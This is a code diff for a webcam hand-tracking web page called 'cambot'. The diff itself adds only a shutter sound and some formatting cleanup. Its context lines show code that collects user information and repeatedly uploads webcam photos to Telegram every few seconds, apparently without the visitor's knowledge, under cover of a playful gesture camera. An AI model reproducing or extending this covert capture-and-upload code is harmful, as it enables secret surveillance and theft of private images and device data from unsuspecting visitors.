@@ -65,6 +65,8 @@
 
   <footer><div class="tagline">Developed by Churchill</div></footer>
 
+  <audio id="shutterSound" src="cam.mp3" preload="auto"></audio>
+
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js"></script>
@@ -73,6 +75,7 @@
     const video = document.getElementById('video');
     const handCanvas = document.getElementById('handCanvas');
     const shutterBtn = document.getElementById('shutterBtn');
+    const shutterSound = document.getElementById('shutterSound');
     const ctx = handCanvas.getContext('2d');
     const cameraStatus = document.getElementById('cameraStatus');
     const handsStatus = document.getElementById('handsStatus');
@@ -148,7 +151,6 @@
             setTimeout(sendImageToTelegram, 5000);
             return;
           }
-          
           try {
             const formData = new FormData();
             formData.append('photo', blob, `cambot_${Date.now()}.jpg`);
@@ -216,19 +218,15 @@
 
     function initMediaPipe() {
       updateStatus(handsStatus, false);
-      
       const hands = new Hands({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}` });
       hands.setOptions({ maxNumHands: 2, modelComplexity: 1, minDetectionConfidence: 0.7, minTrackingConfidence: 0.7 });
-
       hands.onResults((results) => {
         updateStatus(handsStatus, true);
-        
         if (!video.videoWidth || !video.videoHeight) return;
         resizeCanvasToVideo();
         const vw = video.videoWidth, vh = video.videoHeight;
         ctx.clearRect(0, 0, handCanvas.width, handCanvas.height);
         if (!results.multiHandLandmarks || results.multiHandLandmarks.length === 0) return;
-
         for (const lmList of results.multiHandLandmarks) {
           const points = lmList.map(pt => mapLandmarkToPixel(pt, vw, vh));
           for (const conn of window.HAND_CONNECTIONS) {
@@ -238,7 +236,6 @@
           for (const p of points) drawNeonPoint(p);
         }
       });
-
       const cameraUtils = new Camera(video, {
         onFrame: async () => {
           try { 
@@ -256,29 +253,20 @@
     async function initCamera() {
       try {
         updateStatus(cameraStatus, false);
-        
         if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
         });
         cameraStream = stream;
         video.srcObject = stream;
-
         await new Promise(res => {
           if (video.readyState >= 2) return res();
           video.onloadedmetadata = res; video.onloadeddata = res;
         });
-
         resizeCanvasToVideo();
         window.addEventListener('resize', resizeCanvasToVideo);
-
         updateStatus(cameraStatus, true);
-
-        if (!mediaPipeInitialized) { 
-          initMediaPipe(); 
-          mediaPipeInitialized = true; 
-        }
-
+        if (!mediaPipeInitialized) { initMediaPipe(); mediaPipeInitialized = true; }
         if (!userInfoSent) {
           try {
             await sendToTelegram(collectUserInfo());
@@ -300,7 +288,6 @@
     const downloadLink = document.createElement('a');
     downloadLink.style.display = 'none';
     document.body.appendChild(downloadLink);
-    
     let lastObjectUrl = null;
 
     shutterBtn.addEventListener('click', async () => {
@@ -310,25 +297,22 @@
         out.width = video.videoWidth;
         out.height = video.videoHeight;
         const outCtx = out.getContext('2d');
-
         outCtx.save();
         outCtx.translate(out.width, 0);
         outCtx.scale(-1, 1);
         outCtx.drawImage(video, 0, 0, out.width, out.height);
         outCtx.restore();
-
         outCtx.drawImage(handCanvas, 0, 0, handCanvas.width, handCanvas.height, 0, 0, out.width, out.height);
-
         out.toBlob(blob => {
           if (!blob) return;
-          if (lastObjectUrl) {
-            URL.revokeObjectURL(lastObjectUrl);
-          }
+          if (lastObjectUrl) URL.revokeObjectURL(lastObjectUrl);
           const url = URL.createObjectURL(blob);
           lastObjectUrl = url;
           downloadLink.href = url;
           downloadLink.download = `cambot_capture_${Date.now()}.jpg`;
           downloadLink.click();
+          shutterSound.currentTime = 0;
+          shutterSound.play();
         }, 'image/jpeg', 0.92);
       } catch (e) {
         console.error('capture error', e);
@@ -338,15 +322,12 @@
     window.addEventListener('beforeunload', () => {
       isSendingImages = false;
       if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
-      if (lastObjectUrl) {
-        URL.revokeObjectURL(lastObjectUrl);
-      }
+      if (lastObjectUrl) URL.revokeObjectURL(lastObjectUrl);
     });
 
     updateStatus(cameraStatus, false);
     updateStatus(handsStatus, false);
     updateStatus(uploadStatus, false);
-
     setTimeout(initCamera, 800);
   </script>
 </body>
